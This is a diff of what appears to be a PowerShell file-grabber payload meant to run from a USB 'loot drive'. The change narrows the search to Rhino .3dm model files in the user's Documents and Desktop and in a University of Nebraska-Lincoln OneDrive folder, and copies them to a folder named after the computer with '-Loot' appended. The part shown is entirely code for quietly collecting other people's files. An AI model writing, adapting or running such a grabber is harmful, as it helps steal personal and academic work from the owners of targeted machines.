@@ -41,11 +41,15 @@ $drive = Get-WMIObject Win32_LogicalDisk | Where-Object {$_.VolumeName -eq $driv
 $driveLetter = $drive.DeviceID
 Write-Host "Loot Drive Set To : $driveLetter/" -ForegroundColor Green
 
-# Now only searching for .3dm files
+# Now only searching for .3dm files (Rhino 3D model)
 $fileExtensions = @("*.3dm")
 
-# Folders to search for .3dm files
-$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads")  
+# Folders to search for .3dm files (removed Downloads, added OneDrive path)
+$foldersToSearch = @(
+    "$env:USERPROFILE\Documents", 
+    "$env:USERPROFILE\Desktop",
+    "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
+)
 
 $destinationPath = "$driveLetter\$env:COMPUTERNAME-Loot"
 
